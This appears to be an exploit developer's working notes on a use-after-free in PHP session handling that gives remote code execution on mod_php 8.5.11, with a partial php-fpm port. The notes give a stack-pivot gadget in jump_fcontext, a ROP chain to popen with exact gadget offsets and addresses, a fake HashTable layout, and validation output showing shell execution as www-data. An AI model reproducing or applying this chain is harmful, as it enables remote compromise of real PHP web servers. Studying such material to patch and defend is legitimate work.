# B2 pivot + popen ROP variant

Status: validated on mod_php 8.5.11 (10 prefork children, 9 pins, stock
KeepAlive and php.ini-production): `uid=33(www-data)`. The same pivot exists in
the php-fpm binary, but the in-band FPM teardown overwrites the pivot's first
qword with the upload-progress insert; the path around it is the mod_php-style
fake-reference/fake-HashTable B2, which still needs heap calibration. The FPM
`zif_system` chain remains the working FPM RCE.

## Why replace the execute_data frame

The `zif_system` B2 needs a forged `zend_execute_data`: `func`, `num_args`, an
arg0 type that also serves as bucket 2's key, a NUL-terminated fake
`zend_string`, and a usable `return_value`. The pivot variant removes all of
those: a stack pivot plus a short ROP chain to `popen`.

## Mechanism (mod_php)

`pDestructor = libphp + 0x64904E` (inside `jump_fcontext`):

```
mov rsp,rdi                 ; stack = bucket 0 value
mov 0x40(rsp),r8            ; jmp target
ldmxcsr (rsp)               ; MXCSR at +0
fldcw 0x4(rsp)              ; x87 CW at +4
r12..rbp = [rsp+0x10..0x38]
rsp += 0x48
jmp *r8
```

Fake HashTable at `S`, `arData = S+0x20`; bucket 0's value is the pivot buffer:

| bucket offset | value |
|---|---|
| `+0x00` | MXCSR `0x1F80`, fldcw `0x037F` |
| `+0x08` | zval type `IS_NULL` (not `IS_UNDEF`) |
| `+0x10` | pivot (also `HT->pDestructor`; the gadget loads it into r12) |
| `+0x18..0x38` | zero |
| `+0x40` | `pop rdi;ret` (`lib+0x197128`) |
| `+0x48` | command pointer |
| `+0x50` | `pop rsi;ret` (`lib+0x195A89`) |
| `+0x58` | `"r"` pointer |
| `+0x60` | `ret` (`lib+0x183016`) |
| `+0x68` | `popen@plt` (`lib+0x18BBC0`) |

The A2 stale session reference is overwritten with a fake reference pointing to
the fake array; `track_init` destroys it, `zend_hash_destroy` calls
`pDestructor(&bucket0.val)`, and the pivot runs.

## Validation (mod_php)

```
STAGE3=stage3_rop.php CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/rop_proof
main=0x7a63ada00000 libphp=0x7a63aa400000
B2-ROP S=0x7a63adaf7398 pivot=0x7a63aaa4904e popen=0x7a63aa58bbc0
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## FPM attempt

The php-fpm binary (base `0x555555400000` under `setarch -R`) has the same
gadgets:

| gadget | offset | address |
|---|---|---|
| `jump_fcontext` pivot | `0x6bdd0e` | `0x555555abdd0e` |
| `pop rdi;ret` | `0x20a7e8` | `0x55555560a7e8` |
| `pop rsi;ret` | `0x209149` | `0x555555609149` |
| `ret` | `0x20a7e9` | `0x55555560a7e9` |
| `popen@plt` | `0x202e50` | `0x555555602e50` |

The in-band FPM B writes the fake table with the session decode. After
`php_session_normalize_vars()`, the HT's `nNumUsed` (the var c tmp zval type at
`HT+0x18`) is 0; the upload-progress `zend_hash_update` then writes **bucket 0**
with the progress data zval. The pivot's first qword (MXCSR) becomes the stale
progress array pointer `z`; `ldmxcsr` #GPs at `jump_fcontext+8`:

```
HTDESTROY ... nu=1 nt=256 pd=0x555555abdd0e
PIVOT rdi=0x7ffff63b9e00 q0=0x7ffff625c1f8 q40=0x55555560a7e8 ...
SIGSEGV at jump_fcontext+8 (ldmxcsr)
```

The `zif_system` frame tolerated the same write because its opline field is
unused; the pivot cannot. There is no `mov rsp,[rdi+imm]; ret`,
`lea rsp,[rdi+imm]; ret`, or register pivot with a usable ret in the binary.

### Script-path attempt

A script `session_start(); $_SESSION['x'] = 0x0000037F00001F80;` would write a
zval whose 64-bit value supplies a valid MXCSR and fldcw at bucket 0, after a
normalize that leaves `nNumUsed = 0`. Tested: it does not reach the fake
table. `PHP_RINIT_FUNCTION(basic)` zeroes `BG(unserialize)`
(`ext/standard/basic_functions.c:393`) before any script runs, so the B's
`session_start` allocates a fresh `d` instead of reusing the A's dangling one.
The trace shows the B's real session array (`HT=0x7ffff625b230`, `pd=default`,
`nu` 0..6) and no fake table writes. The upload-progress callback's
`php_session_initialize()` runs during POST parsing, before
`zend_activate_modules()`, which is why only that pre-RINIT path reuses the
stale `d`.

### Path

Use the mod_php-style fake reference/fake HashTable B2, triggered in the
upload-progress callback's `php_session_track_init()` **before** the progress
insert and before the RINIT reset: overwrite the A's stale
`PS(http_session_vars)` reference with a fake reference pointing to a fake HT
in the fill. `track_init`'s dtor then runs the pivot with an intact bucket 0;
the progress insert (on the session array) never touches the fake HT. The
mod_php B2's 500x384-byte spray is the starting point; the FPM reference and
fake-HT placement need calibration. A single FPM worker gives the
deterministic heap for that calibration.

Until then, `fpm/run_rce_fpm.sh` with the `zif_system` fill/session is the
working FPM chain.

## Tools

- `off_chain/stage3_rop.php`: B2 variant, select with
  `STAGE3=stage3_rop.php` in `run_off_chain.sh` / `run_off_chain_pinned.sh`.
- `fpm/mk_rop_fill.py`: builds the FPM ROP fill/session from `fillU.bin`
  (analysis artifact; not yet a working FPM chain).
- `fpm/probe-rop.gdb`: FPM trace with PIVOT/POPENPLT breakpoints.

## Caveats

Offsets are for these builds (php:8.5.11-apache libphp and the php-fpm binary);
a real target needs the leaked bases and the same-child affinity. The mod_php
variant still needs the A1/B1 leaks and the pinning (or a single worker). The
FPM variant is not validated end to end.
